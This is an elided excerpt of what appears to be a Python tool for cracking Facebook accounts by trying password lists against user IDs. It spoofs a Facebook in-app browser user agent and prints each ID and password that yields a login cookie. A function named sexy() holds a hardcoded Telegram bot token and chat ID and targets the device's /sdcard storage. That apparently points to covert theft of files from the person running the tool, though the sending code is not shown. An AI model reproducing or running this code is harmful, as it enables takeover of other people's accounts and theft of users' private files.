...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]"}
...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[Test]
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRAKIB\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RAKIB-💚] '+cid+' | '+ps+'\33[0;92m')
...
def sexy():
    ...
    bot_token = '6737132892:AAEfKWv_0-JB_8qz_Bi26M3LaIMaNfoVjYo' 
    chat_id = '6590741007'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
